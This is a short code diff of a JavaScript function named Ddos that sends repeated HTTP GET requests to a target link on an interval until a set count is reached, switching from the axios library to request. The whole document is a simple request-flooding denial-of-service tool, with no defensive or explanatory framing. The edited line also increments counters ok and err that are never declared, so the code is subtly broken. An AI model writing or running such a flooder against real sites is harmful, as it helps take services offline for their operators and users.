@@ -1,12 +1,10 @@
-import axios from "axios";
+import request from "request";
 function Ddos(link, max) {
   let failed = 0;
   let count = 0;
   const inter = setInterval(() => {
     count++;
-    axios.get(link).catch(() => {
-      failed++;
-    })
+    request(link, (error) => (!error ? ok++ : err++));
     if (count > max) {
       clearInterval(inter);
     }
